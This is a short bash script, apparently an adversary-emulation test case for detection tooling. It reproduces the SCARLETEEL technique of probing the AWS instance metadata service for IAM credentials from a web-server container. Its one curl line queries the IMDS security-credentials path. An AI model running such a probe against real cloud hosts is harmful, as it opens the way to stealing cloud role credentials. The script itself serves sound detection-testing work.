#!/usr/bin/env bash
# TJ-1 — T1552.005: IMDS credential probe from a web-server container.
# Corpus: SCARLETEEL (Sysdig TRT, Feb 2023) — initial credential access via IMDS.
# Safe: link-local endpoint; on non-AWS rigs the ATTEMPT (not a response) is the observable.
set -euo pipefail
cd "$(dirname "$0")"
./setup-listener.sh >/dev/null

echo "=== TJ-1 begin $(date -u +%FT%TZ)"
docker exec tj-victim bash -c \
  "curl -s --max-time 3 http://169.254.169.254/latest/meta-data/iam/security-credentials/" \
  || echo "(timeout/refused on non-AWS rig — expected; the attempt is the observable)"
echo "=== TJ-1 end   $(date -u +%FT%TZ)"
